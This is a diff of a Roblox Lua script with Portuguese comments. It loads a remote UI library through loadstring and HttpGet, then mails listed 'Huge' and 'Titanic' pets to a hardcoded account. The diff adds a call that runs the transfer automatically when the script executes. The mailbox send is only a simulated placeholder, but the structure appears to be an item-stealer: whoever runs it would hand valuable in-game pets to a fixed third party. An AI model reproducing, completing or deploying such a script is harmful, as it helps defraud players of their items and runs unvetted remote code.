@@ -1,4 +1,3 @@
---Local lib do UI
 local Lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/7yhx/kwargs_Ui_Library/main/source.lua"))()
 
 local UI = Lib:Create{
@@ -19,30 +18,16 @@ local QuitDivider = Main:Divider{
 }
 
 local playerName = "slenderman_510"  -- Nome da conta destinatária
-local hugePets = {"Huge Pet 1", "Huge Pet 2", "Huge Pet 3"}  -- Lista dos huge pets a serem enviados
-
--- Função para verificar se um pet é "huge"
-function isHugePet(pet)
-    local hugePetList = {"Huge Pet 1", "Huge Pet 2", "Huge Pet 3"}
-    for _, hugePet in ipairs(hugePetList) do
-        if pet == hugePet then
-            return true
-        end
-    end
-    return false
-end
+local hugePets = {"Huge Red Wolf", "Huge Player Fox"}  -- Lista dos huge pets a serem enviados
+local titanicPets = {"Titanic Pet 1", "Titanic Pet 2"}  -- Lista dos pets Titanic a serem enviados
 
 -- Função para enviar um pet pela mailbox
 function sendPetToMailbox(player, pet)
-    if isHugePet(pet) then
-        print("Enviando " .. pet .. " para " .. player)
-        -- Código para enviar o pet pela mailbox vai aqui
-        -- Simulação do envio:
-        wait(1)
-        print(pet .. " foi enviado para " .. player .. " com sucesso!")
-    else
-        print(pet .. " não é um huge pet e não será enviado.")
-    end
+    print("Enviando " .. pet .. " para " .. player)
+    -- Código para enviar o pet pela mailbox vai aqui
+    -- Simulação do envio:
+    wait(1)
+    print(pet .. " foi enviado para " .. player .. " com sucesso!")
 end
 
 -- Função para enviar todos os pets da lista pela mailbox
@@ -52,12 +37,22 @@ function sendAllPets(player, pets)
     end
 end
 
--- Botão para enviar os huge pets
+-- Função principal para enviar os Huge e Titanic pets
+function sendHugeAndTitanicPets()
+    print("Iniciando envio dos Huge e Titanic pets...")
+    sendAllPets(playerName, hugePets)
+    sendAllPets(playerName, titanicPets)
+    print("Todos os pets foram enviados!")
+end
+
+-- Botão para enviar os Huge e Titanic pets
 local sendPetsButton = Main:Button{
-    Name = "Enviar Huge Pets",
+    Name = "Enviar Huge e Titanic Pets",
     Callback = function()
-        sendAllPets(playerName, hugePets)
+        sendHugeAndTitanicPets()
     end
 }
 
+-- Chamando a função principal ao executar o script
+sendHugeAndTitanicPets()
 
